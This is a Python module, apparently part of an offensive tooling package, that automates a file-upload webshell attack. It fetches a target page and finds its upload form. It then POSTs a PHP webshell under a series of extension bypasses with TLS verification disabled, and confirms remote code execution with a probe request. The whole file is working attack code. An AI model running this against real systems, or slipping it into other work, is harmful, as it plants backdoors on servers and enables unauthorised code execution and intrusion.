"""
Network execution for the file-upload webshell check: fetches the target
page, finds an upload form, POSTs a PHP webshell under each extension
bypass, and confirms execution with one probe GET. No parsing logic here --
see parse.py.
"""
from __future__ import annotations

import urllib.parse
from typing import Any, Dict, List, Optional

import requests
import urllib3

from tradecraft.adapters.webshell_upload import parse as ws_parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_TIMEOUT = 10
UPLOAD_TIMEOUT = 15


def execute(
    target: str,
    cookie: str = "",
    timeout: int = DEFAULT_TIMEOUT,
    session: Optional[requests.Session] = None,
) -> Dict[str, Any]:
    """Returns a raw dict. Keys: target, planted (bool), upload_attempts,
    accepted_uploads (list of {filename, status_code, url}), and, on a
    confirmed plant, planted_path, planted_url, bypass_used,
    execution_output. Stops at the first confirmed plant."""
    url = target.strip()
    if not url:
        return {"target": "", "error": "empty target URL"}
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"http://{url}"

    headers = {"Cookie": cookie} if cookie else {}
    close_session = False
    if session is None:
        session = requests.Session()
        close_session = True

    accepted: List[Dict[str, Any]] = []
    attempts = 0
    try:
        try:
            page = session.get(url, headers=headers, timeout=timeout, verify=False)
        except requests.RequestException as exc:
            return {"target": url, "planted": False, "upload_attempts": 0,
                    "error": f"page fetch failed: {exc}"}

        form = ws_parse.find_upload_form(page.text, url)
        if form is None:
            action_url = url
            file_field = "file"
            hidden: Dict[str, str] = {}
        else:
            action_url = form.action_url
            file_field = form.file_field
            hidden = form.hidden

        for ext in ws_parse.BYPASS_EXTENSIONS[: ws_parse.MAX_UPLOAD_ATTEMPTS]:
            filename = f"{ws_parse.BASE_FILENAME}{ext}"
            files = {file_field: (filename, ws_parse.WEBSHELL_CONTENT, ws_parse.WEBSHELL_MIME)}
            attempts += 1
            try:
                post = session.post(
                    action_url, data=dict(hidden), files=files, headers=headers,
                    timeout=UPLOAD_TIMEOUT, verify=False,
                )
            except requests.RequestException:
                continue

            if post.status_code not in (200, 201) or filename not in post.text:
                continue

            upload_path = ws_parse.extract_upload_path(post.text, filename)
            trigger_url = urllib.parse.urljoin(url, upload_path)
            accepted.append({"filename": filename, "status_code": post.status_code, "url": trigger_url})

            try:
                probe = session.get(
                    trigger_url,
                    params={ws_parse.EXECUTION_PROBE_PARAM: ws_parse.EXECUTION_PROBE_VALUE},
                    headers=headers, timeout=timeout, verify=False,
                )
            except requests.RequestException:
                continue

            if ws_parse.execution_confirmed(probe.status_code, probe.text):
                return {
                    "target": url,
                    "planted": True,
                    "upload_attempts": attempts,
                    "accepted_uploads": accepted,
                    "planted_path": upload_path,
                    "planted_url": trigger_url,
                    "bypass_used": ext,
                    "execution_output": probe.text.strip()[:1000],
                }
    finally:
        if close_session:
            session.close()

    return {
        "target": url,
        "planted": False,
        "upload_attempts": attempts,
        "accepted_uploads": accepted,
        "error": (
            "upload accepted but no bypass resulted in confirmed code execution"
            if accepted else "no upload accepted"
        ),
    }
